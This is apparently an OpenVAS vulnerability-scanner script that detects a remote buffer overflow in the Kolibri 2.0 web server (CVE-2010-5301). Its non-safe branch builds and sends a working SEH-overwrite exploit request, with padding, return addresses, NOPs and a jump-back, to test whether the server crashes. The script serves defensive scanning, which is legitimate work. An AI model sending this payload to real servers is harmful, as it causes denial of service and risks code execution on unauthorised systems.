###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_kolibri_45579.nasl 13660 2019-02-14 09:48:45Z cfischer $
#
# Kolibri Remote Buffer Overflow Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103009");
  script_version("$Revision: 13660 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 10:48:45 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2011-01-04 15:14:45 +0100 (Tue, 04 Jan 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2010-5301");
  script_bugtraq_id(45579);
  script_name("Kolibri Remote Buffer Overflow Vulnerability");
  script_category(ACT_MIXED_ATTACK);
  script_family("Web Servers");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("kolibri/banner");

  script_xref(name:"URL", value:"https://www.securityfocus.com/bid/45579");
  script_xref(name:"URL", value:"http://www.senkas.com/kolibri/");

  script_tag(name:"impact", value:"Successfully exploiting this issue may allow remote attackers to
  execute arbitrary commands in the context of the application. Failed
  attacks will cause denial-of-service conditions.");

  script_tag(name:"affected", value:"Kolibri 2.0 is vulnerable. Other versions may also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"Kolibri is prone to a remote buffer-overflow vulnerability because it
  fails to perform adequate checks on user-supplied input.");

  script_tag(name:"qod_type", value:"remote_banner");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("version_func.inc");

port = get_http_port( default:8080 );
banner = get_http_banner( port:port );
if( ! banner || "server: kolibri" >!< tolower( banner ) ) exit( 0 );

if( safe_checks() ) {

  version = eregmatch( pattern:"server: kolibri-([0-9.]+)", string:tolower( banner ) );

  if( ! isnull( version[1] ) ) {
    if( version_is_equal( version:version[1], test_version:"2.0" ) ) {
      report = report_fixed_ver( installed_version:version[1], fixed_version:"None available" );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
} else {

  useragent = http_get_user_agent();
  host = http_host_name(port:port);

  count = make_list(1,2,3,4);
  ret_offset = 515;

  seh_offset_xp_2k3 = 792;
  seh_offset_vista_7 = 794;

  ret_xp_sp3 = raw_string(0x13,0x44,0x87,0x7C);
  ret_2k3_sp2 = raw_string(0xC3,0x3B,0xF7,0x76);

  foreach c (count) {

    if(c == 1) {
      ret = ret_xp_sp3;
      seh_offset = seh_offset_vista_7;
    }
    else if(c == 2) {
      ret = ret_2k3_sp2;
      seh_offset = seh_offset_vista_7;
    }
    else if (c == 3) {
      ret = ret_xp_sp3;
      seh_offset = seh_offset_xp_2k3;
    }
     else if(c == 4) {
      ret = ret = ret_2k3_sp2;
      seh_offset = seh_offset_xp_2k3;
    }

    seh  = raw_string(0x67,0x1a,0x48);
    nseh = raw_string(0x90,0x90,0xeb,0xf7);
    jmp_back2 = raw_string(0xE9,0x12,0xFF,0xFF,0xFF);

    buf = crap(data:raw_string(0x41),length:ret_offset);
    nops = crap(data:raw_string(0x90),length:(seh_offset - strlen(buf + ret + jmp_back2 + nseh)));

    req = string("HEAD /",buf,ret,nops,jmp_back2,nseh,seh," HTTP/1.1\r\n",
                 "Host: ",host,"\r\n",
                 "User-Agent: ",useragent,"\r\n",
                 "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
                 "Accept-Language: he,en-us;q=0.7,en;q=0.3\r\n",
                 "Accept-Encoding: gzip,deflate\r\n",
                 "Accept-Charset: windows-1255,utf-8;q=0.7,*;q=0.7\r\n",
                 "Keep-Alive: 115\r\n",
                 "Connection: keep-alive\r\n\r\n");

    soc = open_sock_tcp(port);
    if(!soc)exit(0);

    send(socket:soc, data:req);
    close(soc);
    sleep(3);

    if(http_is_dead(port:port)) {
      security_message(port:port);
      exit(0);
    }
  }
}

exit( 99 );